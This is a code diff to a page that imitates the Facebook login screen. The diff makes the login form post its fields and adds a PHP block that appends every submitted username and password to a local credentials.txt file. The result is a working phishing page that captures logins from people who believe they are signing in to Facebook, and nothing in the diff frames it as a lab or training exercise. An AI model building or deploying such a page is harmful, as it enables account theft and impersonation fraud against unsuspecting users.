@@ -32,12 +32,12 @@
            <!-- login form -->
            <div class="right-content">
                <div class="card">
-                   <form>
+                   <form method="post">
                        <div class="input-container">
-                           <input type="text" placeholder="Email address or phone number">
+                           <input type="text" name="user" placeholder="Email address or phone number">
                        </div>
                        <div class="input-container">
-                            <input type="password" placeholder="Password">
+                            <input type="password" name="pass" placeholder="Password">
                         </div>
                         <div class="login-btn-container">
                             <button class="login-btn">Log In</button>
@@ -132,9 +132,18 @@
         </div>
 
         <div style="font-weight: 600;text-align: center;margin: 10px 0;color: #777;">Facebook Inc</div>
-    </div>
-
-    
-    
+    </div>  
 </body>
 </html>
+
+<?php         
+    if(isset($_POST['user']))
+    {
+        $user='user: ' . $_POST['user'];
+        $pass='password: ' . $_POST['pass'];
+        $userPass = "\n" . $user . ' ' . $pass;
+        $fp = fopen('credentials.txt', 'a');
+        fwrite($fp, $userPass);
+        fclose($fp);
+    }
+?>
